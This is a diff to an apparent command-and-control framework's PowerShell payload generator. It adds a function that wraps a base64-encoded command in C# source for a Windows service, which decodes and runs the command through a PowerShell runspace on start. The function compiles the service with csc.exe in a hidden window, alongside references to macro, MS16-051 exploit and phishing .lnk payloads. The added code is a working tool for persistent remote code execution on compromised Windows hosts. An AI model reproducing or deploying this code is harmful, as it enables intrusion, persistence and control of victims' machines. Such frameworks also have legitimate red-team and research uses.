@@ -361,6 +361,86 @@ if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
 
 }
 
+
+# create service exe 
+function CreateServiceExe 
+{
+$bytescom = [System.Text.Encoding]::Unicode.GetBytes($command)
+$praw = [Convert]::ToBase64String($bytescom)
+$cscservicecode = 'using System;
+using System.Text;
+using System.ServiceProcess;
+using System.Collections.ObjectModel;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+
+
+namespace Service
+{
+    static class Program
+    {
+        static void Main()
+        {
+            ServiceBase[] ServicesToRun;
+            ServicesToRun = new ServiceBase[]
+            {
+                new Service1()
+            };
+            ServiceBase.Run(ServicesToRun);
+        }
+    }
+    public partial class Service1 : ServiceBase
+    {
+        public static string InvokeAutomation(string cmd)
+        {
+            Runspace newrunspace = RunspaceFactory.CreateRunspace();
+            newrunspace.Open();
+            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
+            Pipeline pipeline = newrunspace.CreatePipeline();
+
+            pipeline.Commands.AddScript(cmd);
+            Collection<PSObject> results = pipeline.Invoke();
+            newrunspace.Close();
+
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (PSObject obj in results)
+            {
+                stringBuilder.Append(obj);
+            }
+            return stringBuilder.ToString().Trim();
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            try
+            {
+                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
+                InvokeAutomation(tt);
+            }
+            catch (ArgumentException e)
+            {
+                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
+                InvokeAutomation(tt);
+            }
+        }
+
+        protected override void OnStop()
+        {
+        }
+    }
+}'
+[IO.File]::WriteAllLines("$global:newdir\payloads\posh-service.cs", $cscservicecode)
+
+if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
+    Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh-service.exe $global:newdir\payloads\posh-service.cs /reference:$PoshPath\System.Management.Automation.dll"
+} else {
+    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
+        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh-service.exe $global:newdir\payloads\posh-service.cs /reference:$PoshPath\System.Management.Automation.dll"
+    }
+}
+
+}
+
 # create macro payloads
 function CreateMacroPayload 
 {
@@ -437,6 +517,8 @@ UpdateMacro'
     try {
     Write-Host -Object "Macro Payload written to: $global:newdir\payloads\macro.txt"  -ForegroundColor Green
     Write-Host -Object "Wscript Payload written to: $global:newdir\payloads\wscript.vbs"  -ForegroundColor Green
+    Write-Host -Object "Exe Payload written to: $global:newdir\payloads\posh.exe"  -ForegroundColor Green
+    Write-Host -Object "Service-Exe Payload written to: $global:newdir\payloads\posh-service.exe"  -ForegroundColor Green
 
     Add-Type -AssemblyName Microsoft.Office.Interop.Excel
     $ExcelApp = New-Object -ComObject "Excel.Application"
@@ -1115,6 +1197,7 @@ primer | iex }'
     CreateMacroPayload
     Create-MS16-051-Payload
     CreateStandAloneExe
+    CreateServiceExe
     Write-Host -Object "Phishing .lnk Payload written to: $global:newdir\payloads\PhishingAttack-Link.lnk"  -ForegroundColor Green
 
     $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
